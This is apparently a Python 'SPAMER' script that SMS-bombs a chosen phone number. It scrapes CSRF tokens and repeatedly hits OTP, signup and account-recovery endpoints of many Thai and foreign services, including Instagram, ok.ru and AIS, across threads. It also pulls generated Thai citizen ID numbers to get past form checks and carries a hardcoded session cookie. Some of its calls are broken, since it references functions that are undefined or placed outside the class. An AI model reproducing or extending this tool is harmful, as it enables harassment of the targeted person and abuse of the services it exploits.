import requests,json,time, sys
import threading, os, time, sys
from requests import Session
from threading import Thread
from re import search
from colorama import Fore, init
from requests import get

os.system('clear')
os.system('pip install requests')
os.system('pip install colorama')

init(convert=True)
textcol = f"{Fore.BLACK}"

def head():
    print(f"""{Fore.RED}\n\n
                
  {Fore.RESET}     [ > SPAMER - BY SCK < ]                                   
  {Fore.RESET}                                            
  {Fore.RESET}   [+] | Usage : [PHONE] [AMOUNT]
  {Fore.RESET}   [+] | METHOD : 200 Api                     
                                                                                                                   
                                                                                                                   """)
        
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def newpage():
    clear()
    head()

newpage()
print("\n\n")

newpage()
print("\n\n")
setnumber = input (" [!] | Enter PhoneNumber : > ")
newpage()
print('\n\n')
n = int(input(" [+] | Amount : > "))
session = requests.Session()

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

class spamsms():

    def shopat(phone):
        requests=Session()
        requests.headers.update(headers)
        token=search('<meta name="_csrf" content="(.*)" />',requests.get("https://www.shopat24.com/register/").text).group(1)
        requests.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code

    def MCard(callphone): #MCard
        TOKEN = search('''<input type="hidden" name="_token" value="(.*)">''', session.get("https://www.mcardmall.com/th/apply/check").text).group(1)
        session.post("https://www.mcardmall.com/th/apply/check", headers={
                    "content-type": "application/x-www-form-urlencoded"
                    }, data=f"_token={TOKEN}&mode=check&identity={spamsms.CardNumber()}&contact={callphone}&P0=on&P1=on&P2=on")

    def CardNumber():
        return search(
        """<td height="50" align="center" valign="top"><input name="sample-citizen-id" type="text" id="sample-citizen-id" value="(.*)" o""", 
        get("http://www.kzynet.com/tools/thai_citizen_id_generator/").text).group(1)


    def SCGID(callphone): #SCGID
        requests.post("https://api.scg-id.com/api/otp/send_otp", headers={
         "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": callphone})

    def spam_cp(phone): #CP
        requests.post('https://cpfmapi.addressasia.com/wp-json/cpfm/v2/customer/get_otp', data = {'phone': phone})

    def spam_bacarrat(phone): #VIP
        requests.post('https://api.baccaratth.com/api/v1/sendotp', data = {'phone_number': phone})

    def spam_mooncash(phone): #moon_crash
        requests.get('http://m.thaiuang.com/uc/authcode/sms/get/reg/'+phone)

    def p1112(phone):
        requests.post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers)

    def delivery1112(phone):
        requests.post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers)

    def ICC(callphone): #ICC
        print(Session().post("https://us-central1-otp-service-icc.cloudfunctions.net/getotp", headers={ 
            "Content-Type": "application/json"
            }, json={"mobile_phone": callphone,"type":"HISHER"}))

    def findclone(phone):
        requests.get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()

    def icq(phone):
        requests.post(f"https://u.icq.net/api/v4/rapi",json={"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": f"66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},headers=headers)

    def okru(phone):
        requests=Session()
        requests.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")

    def unacademy(phone):
        requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers=headers).json()

    def yandex(phone):
        requests.post("https://taxi.yandex.kz/3.0/launch/",json={},headers=headers).json()
        requests.post("https://taxi.yandex.kz/3.0/auth/",json={"id": ["id"], "phone": f"+66{phone[1:]}"},headers=headers)
        

    def homepro(phone):
        requests.post("https://www.homepro.co.th/service/user/profile/otp.jsp",data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"}).json()


    def AISPlay(callphone):
        session = Session() #AISPlay
        print(session.post("https://srfng.ais.co.th/login/sendOneTimePW", 
            data=f"msisdn=66{callphone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", session.get(
                "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36"}).text).group(1)}'''}))
        time.sleep(0.5)

def ig_token():
    d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
    d=search("csrftoken=(.*);",d).group(1).split(";")
    return d[0],d[10].replace(" Secure, ig_did=","")


def instagram(phone):
    token,_=ig_token()
    requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()


def instagramv2(phone):
    token,cid=ig_token()
    requests.post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()


def loop1():
    global setnumber
    spamsms.AISPlay(setnumber)
    spamsms.ICC(setnumber)
    spamsms.spam_bacarrat(setnumber)
    spamsms.spam_cp(setnumber)
    spamsms.spam_pizza(setnumber)
    spamsms.SCGID(setnumber)
    spamsms.MCard(setnumber)
    spamsms.shopat(setnumber)
    spamsms.delivery1112(setnumber)
    spamsms.icq(setnumber)
    spamsms.okru(setnumber)
    spamsms.instagramv2(setnumber)
    spamsms.instagram(setnumber)
    print("ATTACK SMS | METHOD : ALLSPAMER")
for i in range(n):
    time.sleep(0.50)
    threading.Thread(target=loop1).start()